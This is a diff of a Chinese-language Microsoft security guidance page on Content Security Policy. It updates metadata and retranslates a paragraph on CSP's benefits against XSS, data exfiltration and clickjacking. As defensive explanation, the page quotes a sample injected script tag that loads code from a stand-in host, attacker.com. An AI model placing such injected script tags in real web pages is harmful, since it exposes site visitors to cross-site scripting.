@@ -17,12 +17,12 @@ ms.topic: article
 ms.date: 02/07/2017
 ms.author: jegeib
 ms.custom: devx-track-javascript, devx-track-csharp
-ms.openlocfilehash: 9410f06298bd40fe6e0bf8f3fca1be4b87f793ed
-ms.sourcegitcommit: 419cf179f9597936378ed5098ef77437dbf16295
+ms.openlocfilehash: 3aeaebe49999ce65779072f8579a404f9397d50d
+ms.sourcegitcommit: 58d3b3314df4ba3cabd4d4a6016b22fa5264f05a
 ms.translationtype: MT
 ms.contentlocale: zh-CN
-ms.lasthandoff: 08/27/2020
-ms.locfileid: "89004487"
+ms.lasthandoff: 09/02/2020
+ms.locfileid: "89299977"
 ---
 # <a name="security-frame-configuration-management--mitigations"></a>安全框架：配置管理 | 缓解措施 
 | 产品/服务 | 项目 |
@@ -46,7 +46,7 @@ ms.locfileid: "89004487"
 | **适用的技术** | 泛型 |
 | **属性**              | 空值  |
 | **参考**              | [内容安全策略简介](https://www.html5rocks.com/en/tutorials/security/content-security-policy/)、[内容安全策略参考](https://content-security-policy.com/)、[安全功能](https://developer.microsoft.com/microsoft-edge/platform/documentation/dev-guide/security/)、[内容安全策略简介](https://github.com/webplatform/webplatform.github.io/tree/master/docs/tutorials/content-security-policy)、[是否可以使用 CSP？](https://caniuse.com/#feat=contentsecuritypolicy) |
-| **步骤** | <p>内容安全策略 (CSP) 是一种深度防护安全机制，也是一项 W3C 标准，可让 Web 应用程序所有者控制其站点中嵌入的内容。 CSP 以 HTTP 响应标头的形式添加在 Web 服务器上，由浏览器在客户端实施。 它是基于允许列表的策略 - 网站可以声明一组受信任的域，而通过这些域可以加载 JavaScript 等活动内容。</p><p>CSP 提供以下安全优势：</p><ul><li>**XSS 防护：** 如果页面容易受到 XSS 攻击，攻击者可通过两种方式利用这种漏洞：<ul><li>注入 `<script>malicious code</script>`。 由于 CSP 采用 Base Restriction-1，因此这种攻击不起作用</li><li>注入 `<script src="http://attacker.com/maliciousCode.js"/>`。 由于攻击者控制的域不会出现在 CSP 的域允许列表中，因此这种攻击不起作用</li></ul></li><li>**控制数据渗透：** 如果网页中的任何恶意内容尝试连接到外部网站并窃取数据，CSP 将中止该连接。 这是因为，目标域不会出现在 CSP 的允许列表中</li><li>**防范点击劫持：** 点击劫持是一种攻击技法，攻击者布设一个正规的网站，诱迫用户点击其中的 UI 元素。 目前，针对点击劫持的防范措施是通过配置 响应标头 X-Frame-Options 实现的。 并非所有浏览器都支持此标头，从趋势来看，CSP 是防范点击劫持的标准方式。</li><li>**实时攻击报告：** 如果启用 CSP 的网站上发生注入攻击，浏览器会自动向 Web 服务器上配置的终结点触发通知。 这样，CSP 便充当了实时警告系统。</li></ul> |
+| **步骤** | <p>内容安全策略 (CSP) 是一种深度防护安全机制，也是一项 W3C 标准，可让 Web 应用程序所有者控制其站点中嵌入的内容。 CSP 以 HTTP 响应标头的形式添加在 Web 服务器上，由浏览器在客户端实施。 这是允许的基于列表的策略-网站可以声明一组受信任的域，其中的活动内容（例如 JavaScript）可以加载。</p><p>CSP 提供以下安全优势：</p><ul><li>**XSS 防护：** 如果页面容易受到 XSS 攻击，攻击者可通过两种方式利用这种漏洞：<ul><li>注入 `<script>malicious code</script>`。 由于 CSP 采用 Base Restriction-1，因此这种攻击不起作用</li><li>注入 `<script src="http://attacker.com/maliciousCode.js"/>`。 此攻击将不起作用，因为攻击者控制的域将不会在 CSP 的允许域列表中</li></ul></li><li>**控制数据渗透：** 如果网页中的任何恶意内容尝试连接到外部网站并窃取数据，CSP 将中止该连接。 这是因为目标域将不在 CSP 的允许列表中</li><li>**防范点击劫持：** 点击劫持是一种攻击技法，攻击者布设一个正规的网站，诱迫用户点击其中的 UI 元素。 目前，针对点击劫持的防范措施是通过配置 响应标头 X-Frame-Options 实现的。 并非所有浏览器都支持此标头，从趋势来看，CSP 是防范点击劫持的标准方式。</li><li>**实时攻击报告：** 如果启用 CSP 的网站上发生注入攻击，浏览器会自动向 Web 服务器上配置的终结点触发通知。 这样，CSP 便充当了实时警告系统。</li></ul> |
 
 ### <a name="example"></a>示例
 示例策略： 
